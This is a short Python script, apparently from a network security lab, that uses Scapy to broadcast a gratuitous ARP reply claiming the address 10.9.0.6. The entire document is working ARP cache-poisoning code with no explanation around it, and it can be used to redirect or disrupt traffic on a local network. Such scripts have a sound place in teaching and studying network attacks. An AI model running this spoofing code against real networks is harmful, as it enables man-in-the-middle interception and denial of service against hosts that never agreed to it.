from scapy.all import *

ip_B = "10.9.0.6"

Epkt = Ether(dst="ff:ff:ff:ff:ff:ff")
Arppkt = ARP(
	op = 2,
	psrc = ip_B,
	pdst = ip_B,
	hwdst = "ff:ff:ff:ff:ff:ff"
)

pkt = Epkt/Arppkt
sendp(pkt)
